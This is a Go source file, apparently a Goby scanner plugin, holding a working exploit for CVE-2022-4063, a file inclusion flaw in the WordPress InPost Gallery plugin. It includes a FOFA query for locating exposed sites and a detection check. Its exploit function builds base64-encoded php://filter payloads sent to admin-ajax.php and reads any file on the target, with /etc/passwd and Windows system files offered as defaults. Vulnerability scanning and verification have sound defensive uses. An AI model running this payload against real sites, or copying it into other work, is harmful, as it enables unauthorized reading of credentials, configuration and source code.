package exploits

import (
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "WordPress Plugin InPost Gallery popup_shortcode_attributes File Inclusion Vulnerability(CVE-2022-4063)",
    "Description": "<p>InPost Gallery is a powerful and very pleasing photo gallery plugin for working with images in WordPress.There is a file inclusion vulnerability in InPost Gallery &lt; 2.1.4.1. Attackers can exploit this vulnerability to obtain sensitive files.</p>",
    "Product": "WordPress Plugin InPost Gallery",
    "Homepage": "https://wordpress.org/plugins/inpost-gallery",
    "DisclosureDate": "2022-11-28",
    "Author": "sunying",
    "FofaQuery": "body=\"wp-content/plugins/inpost-gallery\"",
    "GobyQuery": "body=\"wp-content/plugins/inpost-gallery\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extremely insecure website.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://wordpress.org/plugins/inpost-gallery\">https://wordpress.org/plugins/inpost-gallery</a></p>",
    "References": [
        "https://wpscan.com/vulnerability/6bb07ec1-f1aa-4f4b-9717-c92f651a90a7"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "createSelect",
            "value": "C:\\Windows\\php.ini,C:\\Windows\\system.ini,/etc/passwd,/etc/hosts",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "File Inclusion"
    ],
    "VulType": [
        "File Read",
        "File Inclusion"
    ],
    "CVEIDs": [
        "CVE-2022-4063"
    ],
    "CNNVD": [
        "CNNVD-202212-3533"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "WordPress InPost Gallery 插件 popup_shortcode_attributes 参数文件包含漏洞（CVE-2022-4063）",
            "Product": "WordPress Plugin InPost Gallery",
            "Description": "<p>InPost Gallery 是一个功能强大且非常令人愉悦的照片库插件，可在 WordPress 中处理图像。InPost Gallery 2.1.4.1版本存在文件包含漏洞，攻击者利用该漏洞可获取敏感文件。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://wordpress.org/plugins/inpost-gallery\">https://wordpress.org/plugins/inpost-gallery</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。</span><br></p>",
            "VulType": [
                "文件读取",
                "文件包含"
            ],
            "Tags": [
                "文件读取",
                "文件包含"
            ]
        },
        "EN": {
            "Name": "WordPress Plugin InPost Gallery popup_shortcode_attributes File Inclusion Vulnerability(CVE-2022-4063)",
            "Product": "WordPress Plugin InPost Gallery",
            "Description": "<p>InPost Gallery is a powerful and very pleasing photo gallery plugin for working with images in WordPress.There is a file inclusion vulnerability in InPost Gallery &lt; 2.1.4.1. Attackers can exploit this vulnerability to obtain sensitive files.<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://wordpress.org/plugins/inpost-gallery\">https://wordpress.org/plugins/inpost-gallery</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extremely insecure website.</span><br></p>",
            "VulType": [
                "File Read",
                "File Inclusion"
            ],
            "Tags": [
                "File Read",
                "File Inclusion"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10781"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			file_inclusion_exp := `{"pagepath": "php://filter/convert.base64-encode/resource=../wp-content/plugins/inpost-gallery/index.php"}`
			file_inclusion_exp_bytes := []byte(file_inclusion_exp)
			exp_base64 := base64.StdEncoding.EncodeToString(file_inclusion_exp_bytes)
			vuln_url := fmt.Sprintf("/wp-admin/admin-ajax.php?action=inpost_gallery_get_gallery&popup_shortcode_key=inpost_fancy&popup_shortcode_attributes=%s",exp_base64)
			cfg := httpclient.NewGetRequestConfig(vuln_url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if response, err :=  httpclient.DoHttpRequest(u, cfg); err == nil {
				decoded, _ := base64.StdEncoding.DecodeString(response.RawBody)
				decodestr_exp := string(decoded)
				return strings.Contains(decodestr_exp,"popup_shortcode_attributes")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := ss.Params["filePath"].(string)
			file_inclusion_exp := fmt.Sprintf(`{"pagepath": "php://filter/convert.base64-encode/resource=%s"}`,filePath)
			file_inclusion_exp_bytes := []byte(file_inclusion_exp)
			exp_base64 := base64.StdEncoding.EncodeToString(file_inclusion_exp_bytes)
			vuln_url := fmt.Sprintf("/wp-admin/admin-ajax.php?action=inpost_gallery_get_gallery&popup_shortcode_key=inpost_fancy&popup_shortcode_attributes=%s",exp_base64)
			cfg := httpclient.NewGetRequestConfig(vuln_url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if response, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				decoded, _ := base64.StdEncoding.DecodeString(response.RawBody)
				decodestr_exp := string(decoded)
				expResult.Success = true
				expResult.OutputType = "html"
				expResult.Output += decodestr_exp
			}
			return expResult
		},
	))
}